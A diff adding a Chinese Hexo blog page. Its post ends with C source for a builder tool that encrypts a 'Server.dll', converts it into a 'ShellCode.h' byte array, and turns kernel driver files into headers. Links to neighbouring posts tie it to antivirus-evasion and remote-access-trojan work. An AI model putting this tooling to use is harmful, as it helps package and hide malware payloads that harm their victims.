+		if (i % 32 == 31 || i == dwDllSize - 1)
+		{
+			*pOutChar++ = '\r';
+			*pOutChar++ = '\n';
+		}
+	}
+	VirtualFree(pDllBuff, 0, MEM_RELEASE);
+
+	char OutData1[] = "/*\r\n ShellCode转换器 By Anonymity\r\n My QQ ????????\r\n"
+		" 直接include此单元，使用 ShellCodeSaveFile(\"xxx.xxx\");即可生成文件\r\n*/\r\n\r\n";
+	char OutData2[] = "#ifndef _HEX_SHELLCODE_\r\n#define _HEX_SHELLCODE_\r\n#include &lt;windows.h&gt;\r\n\r\n";
+	char OutData3[64] = {0};
+	sprintf(OutData3, "const g_ShellCodeFileSize = %d;\r\n", dwDllSize);
+	char OutData4[] = "unsigned char g_ShellCodeFileBuff[] = {\r\n";
+	char OutData5[] = "};\r\n\r\n";
+	char OutData6[] = "/*\r\nbool ShellCodeSaveFile(char *FileName)\r\n{\r\n\tbool Result = false;"
+		"\r\n\tHANDLE hFile;\r\n\tDWORD dwBytesWritten;\r\n"
+		"\thFile = CreateFile(FileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);\r\n"
+		"\tif (hFile == INVALID_HANDLE_VALUE) Result = false;\r\n"
+		"\tif (WriteFile(hFile, g_ShellCodeFileBuff, g_ShellCodeFileSize, &amp;dwBytesWritten, NULL)) Result = true;\r\n"
+		"\tCloseHandle(hFile);\r\n\treturn Result;\r\n}\r\n*/\r\n\r\n#endif\r\n";
+
+	hOutFile = CreateFile("ShellCode.h", GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, NULL);
+	if (hOutFile == INVALID_HANDLE_VALUE)
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData1, strlen(OutData1), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData2, strlen(OutData2), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData3, strlen(OutData3), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData4, strlen(OutData4), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, pOutBuff, (dwDllSize*5-1)+((dwDllSize+32-1)/32*2), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData5, strlen(OutData5), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	if (!WriteFile(hOutFile, OutData6, strlen(OutData6), &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pOutBuff, 0, MEM_RELEASE);
+		CloseHandle(hOutFile);
+		return FALSE;
+	}
+	VirtualFree(pOutBuff, 0, MEM_RELEASE);
+	CloseHandle(hOutFile);
+	return TRUE;
+}
+
+BOOL SavePlug()
+{
+	HANDLE hDllFile;
+	DWORD dwDllSize;
+	LPVOID pDllBuff;
+	DWORD BytesRead;
+	DWORD BytesWritten;
+
+	hDllFile = CreateFile("1.dll", GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hDllFile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	dwDllSize  = GetFileSize(hDllFile, 0);
+
+	pDllBuff = VirtualAlloc(NULL, dwDllSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	if (pDllBuff == NULL)
+	{
+		CloseHandle(hDllFile);
+		return FALSE;
+	}
+	if (!ReadFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesRead, NULL))
+	{
+		VirtualFree(pDllBuff, 0, MEM_RELEASE);
+		CloseHandle(hDllFile);
+		return FALSE;
+	}
+	CloseHandle(hDllFile);
+
+// 	if (((PIMAGE_DOS_HEADER)pDllBuff)-&gt;e_magic == IMAGE_DOS_SIGNATURE)
+// 		//EncryptPlug((unsigned char *)pDllBuff, dwDllSize, 1024);
+// 	else
+// 	//	DecryptPlug((unsigned char *)pDllBuff, dwDllSize, 1024);
+// 
+	hDllFile = CreateFile("2.dll", GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
+	if (hDllFile == INVALID_HANDLE_VALUE)
+	{
+		VirtualFree(pDllBuff, 0, MEM_RELEASE);
+		return FALSE;
+	}
+	if (!WriteFile(hDllFile, pDllBuff, dwDllSize, &amp;BytesWritten, NULL))
+	{
+		VirtualFree(pDllBuff, 0, MEM_RELEASE);
+		CloseHandle(hDllFile);
+		return FALSE;
+	}
+	VirtualFree(pDllBuff, 0, MEM_RELEASE);
+	CloseHandle(hDllFile);
+	return TRUE;
+}
+
+int main(int argc, char* argv[])
+{
+	unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};
+
+	if (argc == 3)
+	{
+		if (argv[1][0] != '-') return -1;
+
+		switch (argv[1][1])
+		{
+		case '3': //输入文件名(QAssist32.sys), 生成"DriverCode32.h"
+			return SaveDr32(argv[2]) ? 0 : -1;
+		case '6': //输入文件名(QAssist64.sys), 生成"DriverCode64.h"
+			return SaveDr64(argv[2]) ? 0 : -1;
+		case 'E': //输入未加密文件名(Server.dll), 生成加密后的文件(Server.dll)
+			return SaveMain(argv[2], (char *)MyFileTabLe) ? 0 : -1;
+		case 'S': //输入已加密文件名(Server.dll), 生成"ShellCode.h"
+			return SaveCode(argv[2]) ? 0 : -1;
+		default:
+			return -1;
+		}
+	}
+	return SavePlug() ? 0 : -1;
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="../../../../../../../about" rel="external nofollow noreferrer">fantasycat6</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://fantasycat6.github.io">https://fantasycat6.github.io</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="../../../../../../../about" target="_blank">fantasycat6</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="../../../../../../../libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="../../../../../../../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="../../../../../../../medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="../bi-ji-1.19-gao-ji-mian-sha-ke-kai-fa-yuan-li/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="../bi-ji-1.8-cong-yuan-ma-jie-jue-rat-mian-sha-wen-ti-zhong/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            fantasycat6
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Hexo<br />'
+            + '文章作者: fantasycat6<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="../../../../../../../libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="../../../../../../../libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7788095093"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="../../../../../../../libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022-2023</span>
+            
+            <span id="year">2022</span>
+            <a href="../../../../../../../about" target="_blank">fantasycat6</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">312.9k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fantasycat6" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1745272762@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1745272762" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1745272762" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="../../../../../../../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('../../../../../../../search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="../../../../../../../libs/materialize/materialize.min.js"></script>
+    <script src="../../../../../../../libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="../../../../../../../libs/aos/aos.js"></script>
+    <script src="../../../../../../../libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="../../../../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="../../../../../../../js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="../../../../../../../libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="../../../../../../../libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="../../../../../../../libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
